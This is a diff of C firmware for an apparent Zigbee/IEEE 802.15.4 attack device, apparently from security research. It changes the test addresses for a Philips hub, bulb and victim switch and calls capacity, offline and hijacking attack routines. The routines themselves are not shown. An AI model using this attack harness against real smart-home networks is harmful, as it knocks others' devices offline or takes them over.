@@ -35,20 +35,18 @@ int main(void)
 	sei();
 	_delay_ms(3000);
 
-	// TODO: Here we need to implement Reconnaissance Attack first to determine device types and device address in the netwrok.
-	// reconnaissance_attack();
-
 	/** TEST FIELD **/
 	uint8_t attack_no = 3;
 	// Here we let dst_device = hub, src_device = sensor to test our API
 	ieee802154_addr hub_addr = {};
-	hub_addr.pan = 0x7051;
-	// hub_addr.epan = ST_EPAN_ID; // Used for ST
-	hub_addr.epan = PHILIPS_EPAN_ID; // Used for Philips
-	hub_addr.short_addr = 0x0001;
-	hub_addr.long_addr = PHILIPS_BRIDGE_MAC_ADDR;
+	hub_addr.pan = 0x2ca2;
+	hub_addr.epan = ST_EPAN_ID; // Used for Philips
+	hub_addr.short_addr = 0x1234;
+	hub_addr.long_addr = 0x12345679;
 	hub_addr.device_type = 0;
 	hub_addr.polling_type = 0;
+	hub_addr.coordinator_flag = 1;
+	hub_addr.beacon_update_id = 1;
 
 	ieee802154_addr bulb_addr = hub_addr;
 	bulb_addr.short_addr = 0x0005;
@@ -57,11 +55,12 @@ int main(void)
 	bulb_addr.polling_type = 0;
 
 	ieee802154_addr victim_addr = hub_addr;
-	victim_addr.short_addr = 0xbf0f;
+	victim_addr.short_addr = 0xf1e7;
 	victim_addr.long_addr = PHILIPS_SWITCH_MAC_ADDR;
 	victim_addr.polling_type = 2;
 	victim_addr.device_type = 2;
-	victim_addr.rx_when_idle = 0;
+	victim_addr.rx_when_idle = 1;
+
 	/** END OF TEST FIELD **/
 
 	while (1)
@@ -73,19 +72,24 @@ int main(void)
 		else if (attack_no == 1)
 		{
 			// Fill up ZED list
-			capacity_attack(&bulb_addr, 0x10000000, 2);
+			led(1);
+			capacity_attack(&hub_addr, 0x15000000, 2);
 			attack_no = 0xff;
+			led(0);
 		}
 		else if (attack_no == 2)
 		{
-			offline_attack(&hub_addr, &victim_addr, 0x20000000);
+			offline_attack(&bulb_addr, &victim_addr, 0x24000000);
 			attack_no = 0xff;
 		}
 		else if (attack_no == 3)
 		{
-			bulb_addr.beacon_update_id = 0x08;
-			hub_addr.beacon_update_id = 0x08;
-			hijacking_attack(&bulb_addr, &victim_addr, 0x30000000);
+			hijacking_attack(&hub_addr, &victim_addr, 0x32000000);
+			attack_no = 0xff;
+		}
+		else if (attack_no == 4)
+		{
+			rx_aack_config aack_config = {};
 			attack_no = 0xff;
 		}
 		else
